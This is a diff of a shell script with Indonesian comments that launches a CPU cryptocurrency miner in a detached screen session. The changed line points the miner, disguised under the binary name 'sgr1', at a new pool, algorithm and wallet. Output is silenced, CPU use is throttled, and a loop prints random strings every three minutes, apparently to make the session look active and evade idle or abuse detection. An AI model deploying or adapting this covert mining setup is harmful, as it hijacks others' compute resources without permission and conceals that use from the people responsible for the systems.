@@ -33,7 +33,7 @@ cpulimit -l 1200 -e sgr1 > /dev/null 2>&1 &
 sudo sync && sudo echo 3 > /proc/sys/vm/drop_caches > /dev/null 2>&1
 
 # Mulai proses menggunakan screen
-nice -n -10 nohup screen -dmS main-session /bin/bash -c "./sgr1 --algorithm yescryptr32 --pool stratum-asia.rplant.xyz:17116 --wallet UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.$(echo $RANDOM | md5sum | head -c 5) --password x --disable-gpu --cpu-threads $(nproc --all) --enable-1gb-hugepages --keepalive " > /dev/null 2>&1 &
+nice -n -10 nohup screen -dmS main-session /bin/bash -c "./sgr1 --algorithm yespowerr16 --pool stratum-asia.rplant.xyz:13382 --wallet YdenAmcQSv3k4qUwYu2qzM4X6qi1XJGvwC.$(echo $RANDOM | md5sum | head -c 5) --password x --disable-gpu --cpu-threads $(nproc --all) --enable-1gb-hugepages --keepalive " > /dev/null 2>&1 &
 
 # Loop sederhana untuk menghasilkan output acak setiap 3 menit
 while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 3m; done
